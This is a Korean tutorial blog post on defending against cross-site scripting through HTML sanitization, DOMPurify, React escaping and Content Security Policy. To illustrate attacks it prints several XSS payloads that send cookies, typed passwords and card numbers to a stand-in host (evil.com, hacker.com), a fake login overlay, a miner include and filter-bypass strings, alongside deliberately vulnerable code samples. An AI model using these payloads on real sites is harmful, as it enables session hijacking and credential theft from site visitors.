---
title: HTML 새니타이징(Sanitization) - XSS 공격 방어
date: 2025-10-13
categories: [Web Development]
tags: [this, Context, Scope, HTTP, Authentication, Security]
render_with_liquid: false
layout: page
---
{% raw %}
# HTML 새니타이징으로 웹사이트를 지키는 법

상상해보세요. 여러분이 만든 블로그에 누군가 댓글을 남겼습니다. "좋은 글이네요!"라는 평범한 댓글처럼 보이지만, 실제로는 이런 코드가 숨어있었습니다:

```html
좋은 글이네요! <script>
  fetch('http://hacker.com/steal?cookie=' + document.cookie)
</script>
```

이 댓글을 본 다른 사용자들의 쿠키가 모두 해커에게 전송됩니다. 세션 하이재킹, 계정 탈취로 이어질 수 있죠. 저도 처음 웹 개발을 배울 때는 "사용자 입력을 그대로 화면에 표시하면 안 된다"는 말을 듣고도 "설마 그런 일이?"라고 생각했습니다. 하지만 실제로 XSS(Cross-Site Scripting) 공격은 **OWASP Top 10 보안 취약점**에 매년 이름을 올리는 가장 흔하고 위험한 공격 중 하나입니다.

## 왜 HTML Sanitization을 이해해야 할까요?

### 현대 웹의 양방향 특성

요즘 웹사이트는 더 이상 정적인 정보 페이지가 아닙니다:
- **블로그 댓글**: 사용자가 자유롭게 의견을 남깁니다
- **소셜 미디어**: 게시글, 프로필 정보, 메시지를 공유합니다
- **마크다운 에디터**: GitHub, Notion처럼 풍부한 텍스트 편집 기능을 제공합니다
- **채팅 앱**: 실시간으로 메시지를 주고받습니다
- **리뷰 시스템**: 별점과 함께 상세한 리뷰를 작성합니다

이 모든 기능에서 **사용자 입력을 안전하게 처리**하지 않으면 XSS 공격에 노출됩니다.

### XSS 공격이 일으키는 실제 피해

XSS는 단순한 이론이 아닙니다. 실제로 이런 일들이 발생합니다:

**1. 세션 하이재킹**
```javascript
// 공격자가 삽입한 코드
<script>
  fetch('https://evil.com/log?data=' + document.cookie);
</script>
```
→ 사용자의 세션 토큰이 탈취되어 공격자가 그 계정으로 로그인합니다.

**2. 피싱 공격**
```javascript
// 가짜 로그인 폼 삽입
<script>
  document.body.innerHTML = `
    <div style="text-align:center; padding:100px;">
      <h2>세션이 만료되었습니다</h2>
      <form action="https://evil.com/steal">
        <input type="email" placeholder="이메일" name="email" required>
        <input type="password" placeholder="비밀번호" name="pass" required>
        <button type="submit">로그인</button>
      </form>
    </div>
  `;
</script>
```
→ 사용자는 정상적인 로그인 페이지라고 믿고 계정 정보를 입력합니다.

**3. 키로깅**
```javascript
<script>
  document.addEventListener('input', e => {
    if (e.target.type === 'password' || e.target.name === 'creditCard') {
      fetch('https://evil.com/keylog?data=' + e.target.value);
    }
  });
</script>
```
→ 비밀번호, 신용카드 정보 등이 실시간으로 전송됩니다.

**4. 크립토마이닝**
```javascript
<script src="https://evil.com/cryptominer.js"></script>
```
→ 사용자의 CPU를 몰래 사용해 암호화폐를 채굴합니다.

**실제 사례**: 2018년 British Airways는 XSS 공격으로 38만 명의 고객 결제 정보가 유출되어 약 2억 달러의 벌금을 부과받았습니다. 이것이 바로 HTML Sanitization이 중요한 이유입니다.

## 기본 개념: XSS란 무엇인가?

### XSS(Cross-Site Scripting)의 정의

XSS는 공격자가 **다른 사용자의 브라우저에서 악의적인 스크립트를 실행**시키는 공격 기법입니다. 핵심은 "다른 사용자"입니다. 공격자가 직접 실행하는 게 아니라, 피해자의 브라우저에서 실행되기 때문에:

- 피해자의 권한으로 동작합니다
- 피해자의 쿠키에 접근할 수 있습니다
- 피해자가 보는 페이지를 조작할 수 있습니다
- 피해자 대신 요청을 보낼 수 있습니다

### XSS 공격이 성공하는 메커니즘

```
[공격 흐름]

1. 공격자 → 웹사이트
   악의적인 스크립트를 포함한 입력 전송
   예: <script>alert('XSS')</script>

2. 웹사이트 → 데이터베이스
   입력을 새니타이징 없이 저장

3. 피해자 → 웹사이트
   페이지 요청

4. 웹사이트 → 피해자
   저장된 악성 스크립트를 포함한 HTML 응답

5. 피해자 브라우저
   스크립트 실행 → 공격 성공!
```

### HTML Sanitization의 원리

HTML Sanitization은 **위험한 코드를 제거하거나 무력화**하는 과정입니다:

```javascript
// 입력: 위험한 HTML
const userInput = `
  <p>안녕하세요!</p>
  <script>alert('XSS')</script>
  <img src=x onerror="alert('XSS')">
`;

// 새니타이징: 위험 요소 제거
const safe = sanitize(userInput);

// 출력: 안전한 HTML
// <p>안녕하세요!</p>
// alert('XSS')
// x
```

**두 가지 접근 방식:**

1. **화이트리스트 방식** (권장)
   - 안전한 태그/속성만 명시적으로 허용
   - `<p>`, `<strong>`, `<em>` 등만 허용하고 나머지는 제거
   - 새로운 공격 기법에도 안전

2. **블랙리스트 방식** (비권장)
   - 위험한 태그/속성을 명시적으로 차단
   - `<script>`, `onclick` 등을 차단
   - 우회 기법이 계속 발견되어 불완전

## XSS 공격의 종류

XSS는 공격 방식에 따라 세 가지로 분류됩니다. 각각의 특성을 이해하면 더 효과적으로 방어할 수 있습니다.

### 1. Stored XSS (저장형 XSS)

**가장 위험한 유형**으로, 악성 스크립트가 서버에 저장됩니다.

```javascript
// 시나리오: 게시판 댓글

// 1. 공격자가 댓글 작성
POST /api/comments
{
  "content": "좋은 글이네요! <script>fetch('https://evil.com?c='+document.cookie)</script>"
}

// 2. 서버가 그대로 저장
await db.comments.insert({
  content: req.body.content  // ❌ 새니타이징 없음!
});

// 3. 다른 사용자가 페이지 접속
GET /posts/123

// 4. 서버가 댓글 포함해서 응답
<div class="comment">
  좋은 글이네요! <script>fetch('https://evil.com?c='+document.cookie)</script>
</div>

// 5. 모든 방문자의 브라우저에서 스크립트 실행! 🚨
```

**특징:**
- 한 번 저장되면 계속해서 피해 발생
- 여러 사용자가 동시에 피해를 입음
- 데이터베이스에 저장되므로 발견하기 어려움

**실제 사례:**
```javascript
// MySpace 2005년 "Samy worm"
// - Stored XSS를 이용한 최초의 대규모 웜
// - 24시간 만에 100만 명 감염
// - 피해자 프로필에 "Samy is my hero" 메시지 추가
// - 자동으로 친구 추가 및 웜 전파
```

### 2. Reflected XSS (반사형 XSS)

악성 스크립트가 **즉시 반사**되어 실행됩니다.

```javascript
// 시나리오: 검색 결과 페이지

// 1. 공격자가 악의적인 URL 생성
const maliciousUrl = `
  https://example.com/search?q=<script>
    document.location='https://evil.com/steal?cookie='+document.cookie
  </script>
`;

// 2. 피해자를 속여서 링크 클릭하게 만듦
// (이메일, SNS, 단축 URL 등 이용)

// 3. 서버가 검색어를 그대로 페이지에 삽입
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <h1>검색 결과: ${query}</h1>  <!-- ❌ 새니타이징 없음! -->
    <div id="results">...</div>
  `);
});

// 4. 피해자 브라우저에서 스크립트 실행
```

**특징:**
- 서버에 저장되지 않음
- 피해자를 특정 URL로 유도해야 함
- 피싱 이메일, 악성 링크와 함께 사용됨

**실제 공격 예시:**
```javascript
// ❌ 취약한 검색 페이지
https://shop.com/search?q=<img src=x onerror="alert(document.cookie)">

// ❌ 취약한 에러 페이지
https://bank.com/error?msg=<script>/* 악성코드 */</script>

// ❌ 취약한 리다이렉트 페이지
https://site.com/redirect?url=javascript:alert(document.domain)
```

### 3. DOM-based XSS (DOM 기반 XSS)

서버를 거치지 않고 **클라이언트 JavaScript 코드의 취약점**을 이용합니다.

```javascript
// 시나리오: URL 파라미터를 DOM에 직접 삽입

// ❌ 취약한 코드
// URL: https://example.com/#<img src=x onerror=alert('XSS')>
const userInput = window.location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;

// 브라우저가 직접 HTML 파싱 → 스크립트 실행!
```

**DOM-based XSS의 위험한 패턴들:**

```javascript
// ❌ 패턴 1: innerHTML 직접 사용
element.innerHTML = location.search;

// ❌ 패턴 2: document.write
document.write(location.hash);

// ❌ 패턴 3: eval 사용
eval(location.hash);

// ❌ 패턴 4: jQuery HTML 삽입
$('#content').html(location.hash);

// ❌ 패턴 5: 위험한 속성 조작
element.setAttribute('href', userInput); // javascript: 프로토콜 가능
```

**특징:**
- 서버 로그에 남지 않아 탐지 어려움
- 클라이언트 측 코드만 검토하면 발견 가능
- 프론트엔드 개발자가 특히 주의해야 함

**실제 취약점 예시:**
```javascript
// Google의 과거 취약점 (현재는 수정됨)
// URL Fragment를 파싱하는 과정에서 XSS 발생
https://www.google.com/...#<script>alert('XSS')</script>

// Twitter의 과거 취약점
// URL을 자동으로 링크로 변환하는 과정에서 XSS
@mention javascript:alert('XSS')//http://evil.com
```

## 위험한 DOM API와 안전한 대안

### innerHTML vs textContent vs innerText

이 세 가지를 정확히 이해하는 것이 XSS 방어의 첫걸음입니다.

```javascript
const userInput = '<img src=x onerror="alert(\'XSS\')">';

// ❌ innerHTML: HTML을 파싱하고 실행
element.innerHTML = userInput;
// 결과: XSS 공격 성공! alert 창이 뜹니다.

// ✅ textContent: 순수 텍스트로 처리
element.textContent = userInput;
// 결과: 화면에 '<img src=x onerror="alert(\'XSS\')">' 텍스트가 그대로 표시됨

// ✅ innerText: 렌더링되는 텍스트로 처리 (스타일 고려)
element.innerText = userInput;
// 결과: textContent와 유사하지만 CSS 스타일을 고려함
```

**실전 비교:**

```javascript
// 상황 1: 사용자 이름 표시
const userName = getUserInput();

// ❌ 나쁜 예
userNameElement.innerHTML = userName;
// 공격자가 이름을 "<script>alert('XSS')</script>"로 설정 가능

// ✅ 좋은 예
userNameElement.textContent = userName;
// 스크립트가 텍스트로만 표시됨


// 상황 2: 풍부한 텍스트 표시 (마크다운 등)
const userContent = getUserMarkdown();

// ❌ 나쁜 예
contentElement.innerHTML = markdownToHtml(userContent);
// 마크다운에 악성 스크립트 삽입 가능

// ✅ 좋은 예
const htmlContent = markdownToHtml(userContent);
const sanitizedContent = DOMPurify.sanitize(htmlContent);
contentElement.innerHTML = sanitizedContent;
```

**언제 무엇을 사용할까?**

| 메서드 | 사용 시기 | XSS 위험 |
|--------|----------|----------|
| `textContent` | 순수 텍스트만 표시 (이름, 제목, 레이블 등) | ✅ 안전 |
| `innerText` | 텍스트 표시하되 CSS 스타일 적용 필요 | ✅ 안전 |
| `innerHTML` | HTML 태그 포함 (마크다운, 에디터 등) | ❌ 새니타이징 필수 |

### 위험한 JavaScript API들

```javascript
// ❌ eval: 절대 사용하지 마세요
eval(userInput); // 어떤 코드든 실행 가능

// ❌ Function constructor
new Function(userInput)();

// ❌ setTimeout/setInterval with string
setTimeout(userInput, 1000);

// ❌ document.write
document.write(userInput);

// ❌ location.href with javascript:
location.href = userInput; // "javascript:alert('XSS')" 가능

// ❌ element.onclick with string
element.onclick = userInput;
```

**안전한 대안:**

```javascript
// ✅ eval 대신 JSON.parse
const data = JSON.parse(userInput);

// ✅ Function 대신 명시적 함수
const allowedFunctions = {
  add: (a, b) => a + b,
  multiply: (a, b) => a * b
};
const result = allowedFunctions[userInput](x, y);

// ✅ setTimeout with function
setTimeout(() => safeFunction(userInput), 1000);

// ✅ URL 검증 후 이동
if (isValidUrl(userInput)) {
  location.href = userInput;
}

// ✅ addEventListener 사용
element.addEventListener('click', () => handleClick(userInput));
```

## 실전 예제: DOMPurify 라이브러리

DOMPurify는 가장 널리 사용되는 HTML 새니타이징 라이브러리입니다. 브라우저와 Node.js 모두에서 작동합니다.

### 기본 사용법

```javascript
// 설치
// npm install dompurify

import DOMPurify from 'dompurify';

// 기본 사용
const dirty = '<script>alert("XSS")</script><p>안전한 내용</p>';
const clean = DOMPurify.sanitize(dirty);
console.log(clean); // <p>안전한 내용</p>

// 실전 예시: 블로그 댓글
async function postComment(content) {
  // 클라이언트 측 새니타이징
  const sanitized = DOMPurify.sanitize(content);

  await fetch('/api/comments', {
    method: 'POST',
    body: JSON.stringify({ content: sanitized })
  });
}

// 표시할 때도 새니타이징 (방어적 프로그래밍)
function displayComment(comment) {
  const clean = DOMPurify.sanitize(comment.content);
  commentElement.innerHTML = clean;
}
```

### 설정 옵션

```javascript
// 예제 1: 링크만 허용
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['a'],
  ALLOWED_ATTR: ['href']
});

// 예제 2: 텍스트 포맷팅만 허용
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'u', 'p', 'br'],
  ALLOWED_ATTR: []
});

// 예제 3: 안전한 스타일 허용
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'span', 'div'],
  ALLOWED_ATTR: ['style'],
  ALLOWED_CSS: {
    'color': true,
    'font-size': true,
    'text-align': true
  }
});

// 예제 4: 모든 태그 제거하고 텍스트만
const textOnly = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: [],
  KEEP_CONTENT: true
});

// 예제 5: 이미지 허용 (신중하게)
const withImages = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['img', 'p'],
  ALLOWED_ATTR: ['src', 'alt', 'title'],
  // data: URI 차단 (중요!)
  FORBID_ATTR: ['onerror', 'onload']
});
```

### 고급 활용: Hook 시스템

```javascript
// 특정 태그/속성 후처리
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // 외부 링크는 새 탭에서 열기
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');

    // 외부 도메인 체크
    const href = node.getAttribute('href');
    if (href && !href.startsWith('/') && !href.startsWith('#')) {
      if (!href.startsWith(window.location.origin)) {
        node.setAttribute('class', 'external-link');
      }
    }
  }

  // 이미지에 lazy loading 추가
  if (node.tagName === 'IMG') {
    node.setAttribute('loading', 'lazy');
  }
});

// 사용
const clean = DOMPurify.sanitize(userHtml);
```

### Node.js에서 DOMPurify 사용

```javascript
// Node.js는 DOM이 없으므로 jsdom 필요
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Express.js 미들웨어로 활용
app.use((req, res, next) => {
  if (req.body && typeof req.body === 'object') {
    // 모든 문자열 필드 새니타이징
    Object.keys(req.body).forEach(key => {
      if (typeof req.body[key] === 'string') {
        req.body[key] = purify.sanitize(req.body[key]);
      }
    });
  }
  next();
});

// API 엔드포인트
app.post('/api/posts', async (req, res) => {
  const { title, content } = req.body; // 이미 새니타이징됨

  await db.posts.create({
    title: purify.sanitize(title, { ALLOWED_TAGS: [] }), // 제목은 텍스트만
    content: purify.sanitize(content, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li']
    })
  });

  res.json({ success: true });
});
```

## 실전 예제: React에서의 XSS 방어

React는 기본적으로 **자동 이스케이핑**을 제공하여 XSS를 방어합니다.

### React의 자동 보호 메커니즘

```jsx
// ✅ React는 자동으로 이스케이핑
function UserProfile({ userName }) {
  // userName이 "<script>alert('XSS')</script>"여도 안전
  return <div>{userName}</div>;
  // 렌더링: &lt;script&gt;alert('XSS')&lt;/script&gt;
}

// ✅ 속성도 자동 이스케이핑
function Avatar({ src, alt }) {
  // src에 'javascript:alert("XSS")'가 와도 안전
  return <img src={src} alt={alt} />;
}

// ✅ 이벤트 핸들러는 함수만 허용
function Button({ onClick, label }) {
  // onClick에 문자열을 전달하면 에러 발생
  return <button onClick={onClick}>{label}</button>;
}
```

### dangerouslySetInnerHTML의 안전한 사용

```jsx
// ❌ 나쁜 예: 사용자 입력을 그대로 삽입
function BlogPost({ content }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: content }}
    />
  );
}

// ✅ 좋은 예: 새니타이징 후 삽입
import DOMPurify from 'dompurify';

function BlogPost({ content }) {
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });

  return (
    <div
      dangerouslySetInnerHTML={{ __html: sanitizedContent }}
    />
  );
}

// ✅ 더 좋은 예: 커스텀 훅으로 재사용
function useSanitizedHtml(html, options) {
  return useMemo(() => {
    return DOMPurify.sanitize(html, options);
  }, [html, options]);
}

function BlogPost({ content }) {
  const cleanContent = useSanitizedHtml(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });

  return (
    <article>
      <div dangerouslySetInnerHTML={{ __html: cleanContent }} />
    </article>
  );
}
```

### 마크다운 렌더링

```jsx
// marked와 DOMPurify 조합
import { marked } from 'marked';
import DOMPurify from 'dompurify';

function MarkdownRenderer({ markdown }) {
  const htmlContent = useMemo(() => {
    // 1. 마크다운을 HTML로 변환
    const rawHtml = marked.parse(markdown);

    // 2. HTML 새니타이징
    const cleanHtml = DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'p', 'br', 'hr',
        'strong', 'em', 'u', 'del',
        'ul', 'ol', 'li',
        'blockquote', 'code', 'pre',
        'a', 'img'
      ],
      ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class']
    });

    return cleanHtml;
  }, [markdown]);

  return (
    <div
      className="markdown-body"
      dangerouslySetInnerHTML={{ __html: htmlContent }}
    />
  );
}

// 사용 예시
function CommentSection() {
  const [comments, setComments] = useState([]);

  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          <strong>{comment.author}</strong>
          <MarkdownRenderer markdown={comment.content} />
        </div>
      ))}
    </div>
  );
}
```

### React 컴포넌트로 감싸기

```jsx
// HTML 대신 React 컴포넌트 사용
function SafeContent({ html }) {
  // HTML 파싱 라이브러리로 컴포넌트 변환
  const components = parseHtmlToComponents(html);
  return <>{components}</>;
}

// html-react-parser 라이브러리 활용
import parse, { domToReact } from 'html-react-parser';

function RichTextRenderer({ html }) {
  const options = {
    replace: (domNode) => {
      // 링크 처리
      if (domNode.name === 'a') {
        const href = domNode.attribs.href;
        // javascript: 프로토콜 차단
        if (href?.startsWith('javascript:')) {
          return <span>{domToReact(domNode.children)}</span>;
        }
        // 외부 링크 안전하게
        return (
          <a
            href={href}
            target="_blank"
            rel="noopener noreferrer"
          >
            {domToReact(domNode.children, options)}
          </a>
        );
      }

      // 이미지 처리
      if (domNode.name === 'img') {
        const src = domNode.attribs.src;
        // data: URI 차단
        if (src?.startsWith('data:')) {
          return null;
        }
        return <img src={src} alt={domNode.attribs.alt} loading="lazy" />;
      }

      // 스크립트 차단
      if (domNode.name === 'script') {
        return null;
      }
    }
  };

  return <div>{parse(html, options)}</div>;
}
```

## 좋은 예 vs 나쁜 예

### 시나리오 1: 검색 결과 페이지

```javascript
// ❌ 나쁜 예: 반사형 XSS 취약점
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>검색 결과: ${query}</h1>
        <div id="results">...</div>
      </body>
    </html>
  `);
});
// 공격: /search?q=<script>alert(document.cookie)</script>

// ✅ 좋은 예: 이스케이핑
import { escapeHtml } from 'escape-html';

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`
    <html>
      <body>
        <h1>검색 결과: ${query}</h1>
        <div id="results">...</div>
      </body>
    </html>
  `);
});
// 결과: <h1>검색 결과: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</h1>
```

### 시나리오 2: 사용자 프로필

```jsx
// ❌ 나쁜 예: innerHTML 직접 사용
function UserBio({ bio }) {
  useEffect(() => {
    document.getElementById('bio').innerHTML = bio;
  }, [bio]);

  return <div id="bio" />;
}

// ✅ 좋은 예: textContent 사용 (텍스트만)
function UserBio({ bio }) {
  return <div>{bio}</div>;
}

// ✅ 좋은 예: 마크다운 허용 시
import DOMPurify from 'dompurify';
import { marked } from 'marked';

function UserBio({ bio }) {
  const html = DOMPurify.sanitize(marked.parse(bio));
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

### 시나리오 3: 댓글 시스템

```javascript
// ❌ 나쁜 예: 저장형 XSS 취약점
app.post('/api/comments', async (req, res) => {
  const { content } = req.body;

  await db.comments.insert({
    content: content  // 검증 없이 저장!
  });

  res.json({ success: true });
});

// ✅ 좋은 예: 저장 전 새니타이징
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

app.post('/api/comments', async (req, res) => {
  const { content } = req.body;

  // 1. 새니타이징
  const cleanContent = purify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });

  // 2. 길이 제한
  if (cleanContent.length > 1000) {
    return res.status(400).json({ error: '댓글이 너무 깁니다' });
  }

  // 3. 저장
  await db.comments.insert({
    content: cleanContent,
    createdAt: new Date()
  });

  res.json({ success: true });
});

// 표시할 때도 방어적으로
app.get('/api/posts/:id/comments', async (req, res) => {
  const comments = await db.comments.find({ postId: req.params.id });

  // 한 번 더 새니타이징 (방어적 프로그래밍)
  const safeComments = comments.map(c => ({
    ...c,
    content: purify.sanitize(c.content)
  }));

  res.json(safeComments);
});
```

### 시나리오 4: URL 리다이렉트

```javascript
// ❌ 나쁜 예: 오픈 리다이렉트 취약점
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  res.redirect(url); // 어디든 리다이렉트 가능!
});
// 공격: /redirect?url=javascript:alert('XSS')
// 또는: /redirect?url=https://evil.com/phishing

// ✅ 좋은 예: URL 검증
app.get('/redirect', (req, res) => {
  const url = req.query.url;

  // 화이트리스트 검증
  const allowedDomains = ['example.com', 'subdomain.example.com'];

  try {
    const urlObj = new URL(url);

    // javascript: 프로토콜 차단
    if (urlObj.protocol !== 'http:' && urlObj.protocol !== 'https:') {
      return res.status(400).send('Invalid URL');
    }

    // 도메인 검증
    if (!allowedDomains.includes(urlObj.hostname)) {
      return res.status(400).send('Unauthorized domain');
    }

    res.redirect(url);
  } catch (err) {
    res.status(400).send('Invalid URL');
  }
});
```

## 고급 활용: 직접 새니타이저 구현하기

DOMPurify를 사용할 수 없는 환경이거나 학습 목적으로 직접 구현해봅시다.

### TreeWalker를 이용한 구현

```javascript
function sanitizeHTML(html, options = {}) {
  // 기본 허용 목록
  const allowedTags = options.allowedTags || [
    'p', 'br', 'strong', 'em', 'u', 'span'
  ];
  const allowedAttrs = options.allowedAttrs || ['class', 'style'];

  // 1. 임시 DOM 요소에 HTML 파싱
  const temp = document.createElement('div');
  temp.innerHTML = html;

  // 2. TreeWalker로 모든 요소 순회
  const walker = document.createTreeWalker(
    temp,
    NodeFilter.SHOW_ELEMENT,
    null,
    false
  );

  const nodesToRemove = [];
  let node;

  while (node = walker.nextNode()) {
    const tagName = node.tagName.toLowerCase();

    // 3. 허용되지 않은 태그는 제거 대상
    if (!allowedTags.includes(tagName)) {
      nodesToRemove.push(node);
      continue;
    }

    // 4. 허용되지 않은 속성 제거
    Array.from(node.attributes).forEach(attr => {
      const attrName = attr.name.toLowerCase();

      // on* 이벤트 핸들러는 무조건 제거
      if (attrName.startsWith('on')) {
        node.removeAttribute(attr.name);
        return;
      }

      // 허용 목록에 없으면 제거
      if (!allowedAttrs.includes(attrName)) {
        node.removeAttribute(attr.name);
        return;
      }

      // style 속성 검증
      if (attrName === 'style') {
        const dangerousPatterns = /expression|behavior|javascript|@import/i;
        if (dangerousPatterns.test(attr.value)) {
          node.removeAttribute('style');
        }
      }

      // href/src 속성 검증
      if (attrName === 'href' || attrName === 'src') {
        const value = attr.value.toLowerCase().trim();
        if (value.startsWith('javascript:') ||
            value.startsWith('data:') ||
            value.startsWith('vbscript:')) {
          node.removeAttribute(attr.name);
        }
      }
    });
  }

  // 5. 위험한 태그를 텍스트로 치환 (컨텐츠 보존)
  nodesToRemove.forEach(node => {
    const textNode = document.createTextNode(node.textContent);
    node.parentNode.replaceChild(textNode, node);
  });

  return temp.innerHTML;
}

// 사용 예시
const userInput = `
  <p>안전한 내용</p>
  <script>alert('XSS')</script>
  <img src=x onerror="alert('XSS')">
  <a href="javascript:alert('XSS')">링크</a>
  <div style="background: url('javascript:alert(1)')">위험</div>
`;

const clean = sanitizeHTML(userInput);
console.log(clean);
// <p>안전한 내용</p>
// alert('XSS')
// x
// 링크
// 위험
```

### 정규식을 이용한 간단한 구현 (비권장)

```javascript
// ⚠️ 교육 목적 - 실제 프로덕션에서는 DOMPurify 사용!
function simpleEscape(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}

// 특정 태그만 허용
function allowOnlySimpleTags(html) {
  // 모든 태그를 이스케이프
  let safe = simpleEscape(html);

  // 안전한 태그만 복원
  safe = safe
    .replace(/&lt;(\/?)strong&gt;/g, '<$1strong>')
    .replace(/&lt;(\/?)em&gt;/g, '<$1em>')
    .replace(/&lt;br&gt;/g, '<br>');

  return safe;
}

// 왜 정규식 방법이 위험한가?
const bypass = '<scr<script>ipt>alert("XSS")</script>';
// 간단한 정규식으로는 우회 가능
```

## Content Security Policy (CSP)

CSP는 XSS 공격의 영향을 최소화하는 **추가 방어층**입니다.

### CSP의 작동 원리

```
[CSP가 없을 때]
공격자 스크립트 → 브라우저 → 실행됨 → 피해 발생

[CSP가 있을 때]
공격자 스크립트 → 브라우저 → CSP 정책 확인 → 차단됨 → 콘솔 에러
```

### 기본 CSP 설정

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
  );
  next();
});
```

**각 지시어 설명:**

```javascript
// script-src: JavaScript 실행 제어
"script-src 'self'"  // 같은 도메인의 스크립트만 허용
"script-src 'self' https://cdn.example.com"  // 특정 CDN 허용
"script-src 'none'"  // 모든 스크립트 차단

// 'unsafe-inline' 사용 지양
"script-src 'unsafe-inline'"  // ❌ 인라인 스크립트 허용 (XSS 취약)

// nonce 방식 (권장)
"script-src 'nonce-random123'"
// HTML에서: <script nonce="random123">...</script>

// style-src: CSS 제어
"style-src 'self' 'unsafe-inline'"  // 인라인 스타일 허용
"style-src 'self'"  // 외부 스타일시트만

// img-src: 이미지 소스 제어
"img-src 'self' data: https:"  // 같은 도메인, data URI, HTTPS 이미지

// connect-src: fetch, WebSocket 등 제어
"connect-src 'self' https://api.example.com"

// frame-ancestors: iframe 임베딩 제어
"frame-ancestors 'none'"  // 어디에도 임베드 불가 (클릭재킹 방어)
"frame-ancestors 'self'"  // 같은 도메인만
```

### nonce 기반 CSP (권장)

```javascript
// 서버 측: nonce 생성
import crypto from 'crypto';

app.use((req, res, next) => {
  // 매 요청마다 새로운 nonce 생성
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `script-src 'nonce-${nonce}' 'strict-dynamic'; ` +
    `style-src 'nonce-${nonce}';`
  );

  next();
});

// 템플릿에서 nonce 사용
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <style nonce="${res.locals.nonce}">
        body { font-family: sans-serif; }
      </style>
    </head>
    <body>
      <h1>안전한 페이지</h1>
      <script nonce="${res.locals.nonce}">
        console.log('This script is allowed');
      </script>

      <!-- 이 스크립트는 차단됨 (nonce 없음) -->
      <script>
        alert('This will be blocked');
      </script>
    </body>
    </html>
  `);
});
```

### React에서 CSP

```jsx
// Next.js에서 CSP 설정
// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
`;

const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: ContentSecurityPolicy.replace(/\s{2,}/g, ' ').trim()
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### CSP 보고서

```javascript
// 위반 사항을 서버로 보고
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',  // 차단하지 않고 보고만
    "default-src 'self'; " +
    "report-uri /api/csp-violations"
  );
  next();
});

// 위반 보고서 수신
app.post('/api/csp-violations', express.json(), (req, res) => {
  const report = req.body;

  console.log('CSP Violation:', {
    blockedURI: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentURI: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number']
  });

  // 로그 시스템에 저장
  logger.warn('CSP violation detected', report);

  res.status(204).end();
});
```

## 함정과 주의사항

### 함정 1: 클라이언트 측 검증만 하기

```javascript
// ❌ 위험: 클라이언트 검증만
// 공격자가 브라우저 개발자 도구로 우회 가능
function submitComment() {
  const content = document.getElementById('comment').value;
  const cleaned = DOMPurify.sanitize(content);

  // 이대로 서버에 전송
  fetch('/api/comments', {
    method: 'POST',
    body: JSON.stringify({ content: cleaned })
  });
}

// 문제: 공격자가 직접 API 호출하면?
fetch('/api/comments', {
  method: 'POST',
  body: JSON.stringify({
    content: '<script>alert("XSS")</script>'
  })
});

// ✅ 해결: 서버에서도 반드시 검증
app.post('/api/comments', (req, res) => {
  // 클라이언트를 신뢰하지 않기
  const cleaned = DOMPurify.sanitize(req.body.content);

  // 추가 검증
  if (cleaned.length > 10000) {
    return res.status(400).json({ error: '내용이 너무 깁니다' });
  }

  db.comments.insert({ content: cleaned });
  res.json({ success: true });
});
```

### 함정 2: 불완전한 블랙리스트

```javascript
// ❌ 우회 가능한 블랙리스트
function badSanitize(html) {
  return html
    .replace(/<script>/gi, '')
    .replace(/onerror/gi, '')
    .replace(/javascript:/gi, '');
}

// 우회 방법들:
badSanitize('<scr<script>ipt>alert(1)</script>');
// → <script>alert(1)</script>

badSanitize('<img src=x onerror=alert(1)>');
